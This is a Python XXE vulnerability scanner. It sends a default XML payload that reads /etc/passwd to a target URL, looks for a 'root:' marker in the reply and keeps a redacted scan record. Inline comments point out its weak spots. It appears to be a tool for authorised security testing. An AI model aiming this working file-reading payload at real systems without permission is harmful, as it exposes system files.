import argparse
import logging
import sys

import requests
from urllib.parse import urlparse

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

DEFAULT_PAYLOAD = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>"""

# The default payload reads /etc/passwd on the target, so its expected
# content marker is the passwd file root entry.
DEFAULT_INDICATOR = "root:"


def setup_argparse():
    """
    Sets up the argument parser for the command-line interface.
    """
    parser = argparse.ArgumentParser(description="Scans for XML External Entity (XXE) vulnerabilities.")
    parser.add_argument("url", help="The target URL to scan.")
    parser.add_argument("-p", "--payload", default=DEFAULT_PAYLOAD, help="The XXE payload to inject.  Default reads /etc/passwd")
    parser.add_argument("--indicator", default=None, help="String expected in the response when the payload succeeds (for example a marker from the file the payload reads). Required to confirm a custom payload; the default payload checks for /etc/passwd style content.")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output (debug logging).")
    parser.add_argument("-o", "--output", help="Output file to save the scan record to. By default the record holds status, response size, the indicator result, and a redacted excerpt only; the full response body is never written unless --save-full-body is given.")
    parser.add_argument("--save-full-body", action="store_true", help="With -o, also write the full response body to the output file. This can persist file content extracted from a vulnerable target in clear; use only where that is intended.")
    parser.add_argument("-m", "--method", default="POST", choices=["GET", "POST"], help="HTTP method to use (GET or POST). Default is POST.")
    parser.add_argument("-d", "--data", default="xml=<data>", help="Data parameter for the payload. Where the payload will be injected. Default is 'xml=<data>'")

    return parser.parse_args()


def is_valid_url(url):
    """
    Validates if the provided URL is valid.
    """
    try:
        result = urlparse(url)
        return all([result.scheme in ("http", "https"), result.netloc])
    except Exception:
        return False


def resolve_indicator(args):
    """Return the indicator for the payload actually sent, or None.

    An operator supplied --indicator wins. The default payload reads
    /etc/passwd, so its indicator is the passwd root entry marker. A
    custom payload without --indicator has no derivable expected
    content, so detection cannot be confirmed for it.
    """
    if args.indicator:
        return args.indicator
    # The comparison is against the exact default string. A caller who copies the default payload and changes one space or one file name is on the custom path with no indicator, and the run ends inconclusive unless they also thought to pass one, even though the file they targeted is the same one.
    if args.payload == DEFAULT_PAYLOAD:
        return DEFAULT_INDICATOR
    return None


def send_request(url, method, data, payload):
    """
    Sends the HTTP request with the crafted XML payload.

    Every response the server returns is handed back for analysis,
    including 4xx and 5xx responses: reflected entity content normally
    surfaces in error status bodies, so the status never discards the
    body. Returns None only when no response was received at all.
    """
    try:
        # The content type claims application XML even when the payload is wrapped inside a form style parameter by the data template. Some servers route on that header and some on the body shape, so the same run can be an XML test against one target and a form post against another.
        headers = {'Content-Type': 'application/xml'}

        if method == "GET":
            # On the GET path the payload is glued into the query string with no encoding, question mark added even when the target already carries a query. The default payload holds spaces, quotes, and an ampersand shaped entity reference, so what the server receives is whatever its URL parser makes of that string, which is rarely the document I wrote. The POST path below does not have this problem, because the body goes as bytes.
            url = url + "?" + data.replace("<data>", payload)
            response = requests.get(url, headers=headers, timeout=10)
        else:  # POST
            post_data = data.replace("<data>", payload)
            response = requests.post(url, data=post_data.encode('utf-8'), headers=headers, timeout=10)

        logging.info(f"Response received: status {response.status_code}, {len(response.content)} bytes")
        return response
    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed: {e}")
        return None


def analyze_response(response, indicator):
    """
    Analyzes the response for the indicator tied to the payload sent.
    Returns True when the indicator is present, False when absent, and
    None when no indicator is available for the payload.
    """
    if indicator is None:
        logging.warning("No indicator available for this custom payload; pass --indicator with the content the payload is expected to return. Detection is inconclusive.")
        return None
    if response is not None and response.text:
        if indicator in response.text:
            logging.warning(f"Possible XXE vulnerability detected: indicator found in response (status {response.status_code}).")
            return True
        logging.info(f"No XXE indicator found in response (status {response.status_code}).")
        return False
    # An empty body returns False here, the same answer as a body that was read and held no indicator. Nothing was learned from an empty response, so reading it as a clean result rather than an unknown is a choice I would want a reader to notice.
    logging.warning("Empty response received. Unable to analyze.")
    return False


def redacted_excerpt(text, indicator, matched=False, max_lines=5, max_chars=300):
    """Build an excerpt with any line containing the indicator replaced
    by a redaction marker, so extracted content is not persisted. When
    the indicator matched, the body is extracted content by definition,
    so no excerpt is persisted at all."""
    if matched:
        return "[REDACTED: response matched the indicator; body not persisted]"
    lines = []
    for line in text.splitlines()[:max_lines]:
        if indicator and indicator in line:
            lines.append("[REDACTED: line containing the indicator]")
        else:
            lines.append(line)
    # Only lines that contain the indicator itself are redacted in an unmatched excerpt. A response holding file content around a marker the indicator did not match can still put its first five lines in the record, so the excerpt is a smaller exposure, not none.
    return "\n".join(lines)[:max_chars]


def save_output(response, output_file, url, method, indicator, matched, save_full_body=False):
    """
    Saves a scan record to a file. By default the record holds only the
    target, method, status, response size, indicator result, and a
    redacted excerpt. The full body is written only when the operator
    explicitly passed --save-full-body.
    """
    try:
        with open(output_file, "w") as f:
            f.write(f"URL: {url}\n")
            f.write(f"Method: {method}\n")
            f.write(f"Status: {response.status_code}\n")
            f.write(f"Response size: {len(response.content)} bytes\n")
            f.write(f"Indicator checked: {'yes' if indicator else 'no'}\n")
            f.write(f"Indicator matched: {'yes' if matched else 'no' if matched is not None else 'inconclusive'}\n")
            if save_full_body:
                f.write("Full response body (operator requested with --save-full-body):\n")
                # A failed record write is only logged in save_output, and main returns on the match result alone. A run can therefore exit as a completed scan while the record it was asked to keep does not exist.
                f.write(response.text)
            else:
                f.write("Redacted excerpt:\n")
                f.write(redacted_excerpt(response.text, indicator, matched=bool(matched)))
                f.write("\n")
        logging.info(f"Scan record saved to {output_file}")
    except IOError as e:
        logging.error(f"Error saving output to file: {e}")


def main():
    """
    Main function to orchestrate the XXE scanning process.

    Returns an exit code: 0 when the scan ran and the response was
    analyzed, 1 on an invalid URL, a failed request, or a custom
    payload with no indicator to confirm detection against.
    """
    args = setup_argparse()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
        logging.debug("Verbose output enabled.")

    if not is_valid_url(args.url):
        logging.error("Invalid URL provided.")
        return 1

    logging.info(f"Starting XXE scan on {args.url}")

    indicator = resolve_indicator(args)
    response = send_request(args.url, args.method, args.data, args.payload)

    if response is None:
        logging.error("Scan failed due to request error.")
        return 1

    matched = analyze_response(response, indicator)
    if matched:
        # A matched indicator still returns 0 from main below. Found, clean, and every other analyzed outcome share the same exit code, and only failure and inconclusive get a 1, so a calling script still has to read the words to learn the verdict.
        print("Possible XXE vulnerability detected!")

    if args.output:
        save_output(response, args.output, args.url, args.method, indicator, matched,
                    save_full_body=args.save_full_body)

    if matched is None:
        return 1
    return 0


if __name__ == "__main__":
    # Example usage:
    # python main.py http://example.com/xml_endpoint
    # python main.py http://example.com/xml_endpoint -v
    # python main.py http://example.com/xml_endpoint -o output.txt
    # python main.py http://example.com/xml_endpoint -p "<payload>" --indicator "<expected content marker>"
    # python main.py http://example.com/xml_endpoint -m GET
    # python main.py http://example.com/xml_endpoint -m POST -d "data=<data>"
    sys.exit(main())
